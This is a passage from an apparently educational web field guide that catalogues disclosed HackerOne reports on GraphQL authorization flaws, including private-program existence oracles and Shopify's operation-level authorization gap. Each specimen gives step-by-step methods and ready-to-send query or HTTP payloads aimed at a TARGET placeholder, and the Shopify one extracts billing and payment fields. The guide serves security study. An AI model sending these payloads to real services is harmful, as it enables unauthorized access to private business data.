+<div class="catalog">Specimen <b>#347937</b> · security · none · 39 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A GraphQL field that lists reasons a caller cannot perform an action reflects backend state: when a feature/program is actually present the 'FEATURE_GATED' reason is dropped, so the shape of the reasons array discloses the existence of an otherwise-private program.</p>
+<h4>Method</h4><ol><li>Query the Team object for a non-null permission-reason array field (e.g. i_cannot_create_jira_webhook_reasons).</li><li>Baseline a program with no private/paid program: reasons = [CANNOT_VIEW, FEATURE_GATED, PROGRAM_PERMISSION_REQUIRED].</li><li>For target orgs, request the same field; a missing FEATURE_GATED value means the feature is no longer gated -&gt; the org runs a private/active program.</li></ol>
+<div class="pre">query {
+  team(handle: "TARGET") {
+    i_cannot_create_jira_webhook_reasons
+  }
+}
+# reasons WITHOUT "FEATURE_GATED" =&gt; private/active program exists</div>
+<p class="insight"><b>Insight —</b> Negative/permission metadata leaks positive facts. Diff the enum/error/reason values of authorization fields across a known-empty baseline and targets; differences in 'why you cannot' frequently disclose the existence of gated features, private programs, or entitlements.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/347937" target="_blank" rel="noopener">hackerone.com/reports/347937</a></span><a class="src" href="#report-347937" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-350964" style="--sv:var(--sev-none)" data-sev="0" data-votes="24" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Field-value oracle leaks existence of private programs</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#350964</b> · security · none · 24 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Querying me{ remaining_reports(team_handle:X) } from a fresh (no-signal) sandbox account returned 1 for external programs that also run a private H1 program and null otherwise, turning a benign field into a private-existence oracle.</p>
+<h4>Method</h4><ol><li>Create a fresh sandbox account with no reputation/signal</li><li>Alias-query remaining_reports for each candidate team_handle</li><li>1 =&gt; the program runs a hidden private program; null =&gt; it doesn't</li></ol>
+<div class="pre">{"query":"query{query{me{_r:remaining_reports(team_handle:\"TARGET\")}}}"}</div>
+<p class="insight"><b>Insight —</b> Numeric/boolean-ish GraphQL fields (counts, remaining_*, can_*) leak the existence/state of hidden objects; diff the value across handles and across account states (signal).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/350964" target="_blank" rel="noopener">hackerone.com/reports/350964</a></span><a class="src" href="#report-350964" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-409973" style="--sv:var(--sev-none)" data-sev="0" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL data exposure via operation-level (not field-level) authz</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#409973</b> · shopify · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The GraphQL LiveView operation checks permission at the operation entrypoint but not per-field, so a 'No Access' user who submits the full Shop schema selection back receives billing address, store settings, product images/IDs and uploaded file lists.</p>
+<h4>Method</h4><ol><li>Log in as a low/No-Access user on the target store.</li><li>POST the known GraphQL operation (LiveView) with a complete Shop field selection to /admin/api/graphql.</li><li>Read the returned privileged fields (billingAddress, plan, shopifyPaymentsAccount, uploadedImages, etc.).</li></ol>
+<div class="pre">POST /admin/api/graphql HTTP/1.1
+Host: STORE.myshopify.com
+Content-Type: application/json
+
+{"operationName":"LiveView","variables":{},"query":"query LiveView { shop { id billingAddress { address1 city country zip } plan { displayName shopifyPlus } shopifyPaymentsAccount { balance { amount currencyCode } id } uploadedImages(first:0){edges{node{originalSrc id}}} } }"}</div>
+<p class="insight"><b>Insight —</b> When testing GraphQL, replay named privileged operations and request the *full* type selection as a low-priv user. Authz enforced at the resolver/operation boundary often misses individual fields; enumerate every field of returned objects.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/409973" target="_blank" rel="noopener">hackerone.com/reports/409973</a></span><a class="src" href="#report-409973" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (18 of 42 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">GraphQL API labs</a> (hands-on practice).</li>
+<li>All 42 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#introspection-schema-recovery">Introspection &amp; schema recovery</a><a href="#authorization-bypass-traversals">Authorization-bypass traversals</a><a href="#nodes-vs-edges" style="padding-left:24px">↳ nodes vs edges</a><a href="#field-over-fetch" style="padding-left:24px">↳ Field over-fetch</a><a href="#bola-on-by-identifier-queries" style="padding-left:24px">↳ BOLA on by-identifier queries</a><a href="#relay-node-id-enumeration" style="padding-left:24px">↳ Relay node(id:) enumeration</a><a href="#global-id-type-confusion" style="padding-left:24px">↳ Global-ID type confusion</a><a href="#nested-sub-connections" style="padding-left:24px">↳ Nested sub-connections</a><a href="#filters-aggregations-as-authz-bypass" style="padding-left:24px">↳ Filters &amp; aggregations as authz bypass</a><a href="#mutation-response-echo-webhook-exfil" style="padding-left:24px">↳ Mutation response echo &amp; webhook exfil</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (42)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ PortSwigger: GraphQL API</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
